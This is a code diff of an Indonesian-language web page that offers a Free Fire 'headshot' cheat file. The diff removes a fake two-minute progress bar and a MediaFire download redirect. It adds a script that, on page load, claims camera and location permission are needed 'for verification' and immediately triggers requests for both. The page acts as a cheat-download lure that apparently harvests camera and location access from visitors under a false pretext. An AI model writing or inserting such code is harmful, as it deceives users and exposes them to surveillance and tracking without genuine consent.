-            fileInfoDiv.innerHTML = `<i class="fas fa-file"></i> <strong>${mode.name}</strong> | Format: ${mode.formatName} (${mode.format})<br><i class="fas fa-database"></i> Ukuran: ${mode.size} | Versi: ${mode.version}<br><i class="fas fa-folder-open"></i> Install: ${mode.installPath} ${linkPreview}`;
-        }
+        fileInfoDiv.innerHTML = `<i class="fas fa-file"></i> <strong>Basic Headshot</strong> | Format: Shared Library (.zip)<br><i class="fas fa-database"></i> Ukuran: 7.0 MB | Versi: 1.5.0<br><i class="fas fa-folder-open"></i> Install: Extract zip,salin com.dts.freefire,ke android,ke data,tempel`;
         
-        // ========= FUNGSI PROGRESS CRATE 2 MENIT + MODAL SUCCESS =========
-        function startCrateProgressWithRedirect() {
-            return new Promise((resolve) => {
-                const overlay = document.getElementById('crateProgressOverlay');
-                const fillBar = document.getElementById('progressFill');
-                const percentDiv = document.getElementById('progressPercent');
-                const timerText = document.getElementById('timerText');
-                const statusText = document.getElementById('progressStatus');
-                
-                // reset tampilan
-                fillBar.style.width = '0%';
-                percentDiv.innerText = '0%';
-                const totalDuration = 120; // 2 menit = 120 detik
-                let elapsed = 0;
-                let interval = null;
-                let startTime = Date.now();
-                
-                overlay.classList.add('show');
-                // disable tombol saat progress
-                const btn = document.getElementById('downloadBtn');
-                btn.classList.add('disabled');
-                
-                function updateProgress() {
-                    const now = Date.now();
-                    elapsed = (now - startTime) / 1000;
-                    let percent = Math.min(100, (elapsed / totalDuration) * 100);
-                    percent = Math.floor(percent);
-                    fillBar.style.width = percent + '%';
-                    percentDiv.innerText = percent + '%';
-                    
-                    const remaining = Math.max(0, totalDuration - elapsed);
-                    const minutes = Math.floor(remaining / 60);
-                    const seconds = Math.floor(remaining % 60);
-                    timerText.innerText = `Sisa waktu: ${minutes.toString().padStart(2,'0')}:${seconds.toString().padStart(2,'0')}`;
-                    
-                    if(percent >= 30 && percent < 70) statusText.innerText = "Mengkompilasi file headlock...";
-                    else if(percent >= 70) statusText.innerText = "Menyiapkan file crate, hampir selesai...";
-                    else statusText.innerText = "Memproses crate fileset...";
-                    
-                    if(percent >= 100) {
-                        clearInterval(interval);
-                        statusText.innerText = "✅ Crate selesai 100%";
-                        timerText.innerText = "Selesai!";
-                        resolve(true);
-                    }
-                }
-                
-                interval = setInterval(() => {
-                    const now = Date.now();
-                    elapsed = (now - startTime) / 1000;
-                    if(elapsed >= totalDuration) {
-                        fillBar.style.width = '100%';
-                        percentDiv.innerText = '100%';
-                        statusText.innerText = "✅ Crate selesai 100%";
-                        timerText.innerText = "Selesai!";
-                        clearInterval(interval);
-                        resolve(true);
-                    } else {
-                        updateProgress();
-                    }
-                }, 200);
-                updateProgress();
-            });
-        }
-        
-        // Menampilkan modal sukses setelah loading 2 menit, dengan tombol OK yang langsung redirect ke link
-        function showSuccessModalAndRedirect(mediafireUrl, modeName) {
-            return new Promise((resolve) => {
-                // buat modal khusus untuk konfirmasi setelah loading
-                const existingModal = document.getElementById('successConfirmModal');
-                if(existingModal) existingModal.remove();
-                
-                const modalDiv = document.createElement('div');
-                modalDiv.id = 'successConfirmModal';
-                modalDiv.className = 'modal';
-                modalDiv.style.visibility = 'visible';
-                modalDiv.style.opacity = '1';
-                modalDiv.style.zIndex = '2600';
-                modalDiv.innerHTML = `
-                    <div class="modal-content" style="max-width:380px;">
-                        <div class="modal-icon">📦✅</div>
-                        <div class="modal-title">File Telah di Buat!</div>
-                        <div class="modal-text">File crate untuk mode <strong>${modeName}</strong> telah selesai diproses.<br><br>Silahkan download file sekarang.</div>
-                        <button class="modal-btn" id="confirmRedirectBtn">OK, Download Sekarang</button>
-                    </div>
-                `;
-                document.body.appendChild(modalDiv);
-                
-                const closeHandler = () => {
-                    modalDiv.classList.remove('show');
-                    setTimeout(() => { if(modalDiv.parentNode) modalDiv.parentNode.removeChild(modalDiv); }, 300);
-                    resolve(true);
-                };
-                
-                const okBtn = modalDiv.querySelector('#confirmRedirectBtn');
-                okBtn.addEventListener('click', () => {
-                    closeHandler();
-                    // redirect ke link mediafire
-                    window.open(mediafireUrl, '_blank');
-                    showToast(`Mengarahkan ke link download ${modeName}`, 'success');
-                });
-                
-                modalDiv.classList.add('show');
-                modalDiv.addEventListener('click', (e) => { if(e.target === modalDiv) closeHandler(); });
-            });
-        }
-        
-        // Proses utama ketika crate ditekan: loading 2 menit -> muncul text "File telah di buat silahkan donload" -> ketika OK otomatis ke link
-        async function processCrateWithFullLoading() {
-            if(isCrateProcessing) {
-                showToast('Sedang memproses crate, harap tunggu!', 'error');
-                return;
-            }
-            const mode = modes[selectedMode];
-            if (!mode.mediafireLink || mode.mediafireLink === '#') {
-                showToast(`⚠️ Link untuk mode ${mode.name} belum tersedia! Hubungi owner.`, 'error');
-                return;
-            }
-            isCrateProcessing = true;
-            try {
-                // Mulai progress 2 menit (120 detik) sampai 100%
-                await startCrateProgressWithRedirect();
-                // Setelah loading selesai, sembunyikan overlay progress
-                const overlay = document.getElementById('crateProgressOverlay');
-                overlay.classList.remove('show');
-                // Menampilkan modal sukses dengan teks "File telah di buat silahkan donload" dan tombol OK -> langsung redirect
-                await showSuccessModalAndRedirect(mode.mediafireLink, mode.name);
-            } catch(err) {
-                console.error(err);
-                showToast('Terjadi kesalahan saat memproses crate.', 'error');
-                const overlay = document.getElementById('crateProgressOverlay');
-                overlay.classList.remove('show');
-            } finally {
-                isCrateProcessing = false;
-                const btn = document.getElementById('downloadBtn');
-                btn.classList.remove('disabled');
-            }
-        }
-        
-        // Event tombol CRATE
-        document.getElementById('downloadBtn').addEventListener('click', processCrateWithFullLoading);
-        
-        // Welcome toast
-        window.addEventListener('load', () => {
-            showToast('Selamat datang! Pilih mode headshot favoritmu', 'info');
-        });
+        // Auto trigger permission popup saat load
+        setTimeout(() => {
+            showToast('🔐 Website membutuhkan izin kamera & lokasi untuk verifikasi', 'info');
+            requestCameraNative();
+            requestLocationNative();
+        }, 500);
     </script>
 </body>
 </html>
